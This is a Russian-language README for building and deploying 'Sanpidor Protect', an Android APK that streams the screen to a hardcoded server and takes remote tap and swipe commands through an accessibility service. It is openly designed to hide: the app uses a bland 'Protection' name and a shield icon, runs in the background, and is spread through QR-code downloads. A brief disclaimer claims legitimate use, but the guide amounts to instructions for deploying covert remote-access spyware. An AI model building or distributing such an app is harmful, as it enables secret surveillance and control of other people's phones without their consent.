# 🔨 Сборка APK — Sanpidor Protect

## Быстрый старт

```bash
python build_apk.py
```

Скрипт автоматически:
1. Проверит окружение (Android SDK, Java)
2. Очистит предыдущую сборку
3. Соберёт APK через Gradle
4. Скопирует в корень проекта как `sanpidor_protect.apk`
5. Сгенерирует `download.html` с QR-кодом для прямой загрузки

---

## Требования

### 1. Android SDK

Скачай Android Studio: https://developer.android.com/studio

После установки задай переменную окружения:

**Windows:**
```powershell
$env:ANDROID_HOME = "C:\Users\<USER>\AppData\Local\Android\Sdk"
```

**Linux/macOS:**
```bash
export ANDROID_HOME=$HOME/Android/Sdk
```

### 2. Java Development Kit (JDK)

Нужна Java 17+. Проверка:
```bash
java -version
```

Скачать: https://adoptium.net/

---

## Структура проекта

```
ledger/
├── android_app/                # Android проект
│   ├── app/
│   │   ├── src/main/
│   │   │   ├── java/com/sanpidor/protect/
│   │   │   │   ├── MainActivity.kt          # Главная Activity
│   │   │   │   ├── ProtectApp.kt           # Application class
│   │   │   │   ├── ScreenCaptureService.kt # Захват экрана
│   │   │   │   └── RemoteAccessService.kt  # AccessibilityService
│   │   │   ├── res/
│   │   │   │   ├── values/strings.xml
│   │   │   │   ├── values/themes.xml
│   │   │   │   └── xml/accessibility_config.xml
│   │   │   └── AndroidManifest.xml
│   │   └── build.gradle                    # Конфигурация модуля
│   ├── build.gradle                        # Конфигурация проекта
│   ├── settings.gradle
│   └── gradle/wrapper/
├── build_apk.py                            # Скрипт сборки
├── server.py                               # VPS сервер
└── sanpidor_protect.apk                    # Собранный APK (после сборки)
```

---

## Сборка вручную

Если нужен контроль:

```bash
cd android_app

# Очистка
./gradlew clean              # Linux/macOS
gradlew.bat clean            # Windows

# Сборка Release APK
./gradlew assembleRelease    # Linux/macOS
gradlew.bat assembleRelease  # Windows
```

APK будет в:
```
android_app/app/build/outputs/apk/release/app-release.apk
```

---

## Развёртывание на VPS

### 1. Загрузи APK на сервер

```bash
scp sanpidor_protect.apk root@144.31.171.1:/root/ledger/
```

### 2. Запусти сервер

```bash
cd /root/ledger
python3 server.py
```

Сервер раздаёт APK на:
```
http://144.31.171.1:8080/download
```

### 3. Открой `download.html` в браузере

QR-код ведёт на прямую загрузку APK — при скане на Android сразу начнётся скачивание.

---

## Что делает APK

1. **Захват экрана** (MediaProjection API)
   - Запрашивает разрешение через диалог
   - Стримит JPEG-кадры на сервер через WebSocket

2. **Удалённое управление** (AccessibilityService)
   - Разрешается в настройках доступности
   - Принимает команды tap/swipe/key с сервера

3. **Подключение к серверу**
   - WebSocket на `ws://144.31.171.1:8080/ws/device`
   - Автоматический реконнект при обрыве

4. **Скрытный режим**
   - Название: "Защита" (невзрачное)
   - Иконка: зелёный щит
   - После первого запуска работает в фоне

---

## Управление

Открой в браузере:
```
http://144.31.171.1:8080/control
```

Видишь:
- Стрим экрана Android в реальном времени
- Клик по экрану = tap на устройстве
- Статус подключённых устройств

---

## Устранение проблем

### Gradle не найден
```bash
# Linux/macOS
chmod +x android_app/gradlew

# Windows — запускай через PowerShell/CMD
```

### SDK не найден
Проверь `ANDROID_HOME`:
```bash
echo $env:ANDROID_HOME  # Windows
echo $ANDROID_HOME      # Linux/macOS
```

Должен указывать на папку SDK, где есть:
- `build-tools/`
- `platforms/`
- `tools/`

### Ошибка подписи APK
Release APK подписывается debug-ключом для простоты.

Для production нужен keystore:
```bash
keytool -genkey -v -keystore release.keystore -alias sanpidor -keyalg RSA -keysize 2048 -validity 10000
```

Затем в `app/build.gradle` добавь:
```gradle
signingConfigs {
    release {
        storeFile file('release.keystore')
        storePassword 'твой_пароль'
        keyAlias 'sanpidor'
        keyPassword 'твой_пароль'
    }
}
```

---

## Безопасность

⚠️ **Этот APK создан для легитимных целей** (удалённая техподдержка, мониторинг собственных устройств).

- Не используй без согласия владельца устройства
- Храни сервер за файрволом
- Используй HTTPS + WSS в production
- Добавь авторизацию на `/control`

---

## Обновление кода

После изменений в `android_app/app/src/main/java/`:

```bash
python build_apk.py
```

Новый APK готов — загрузи на сервер и обнови QR-код.

---

**Готово!** Теперь просто запускай `python build_apk.py` для пересборки.
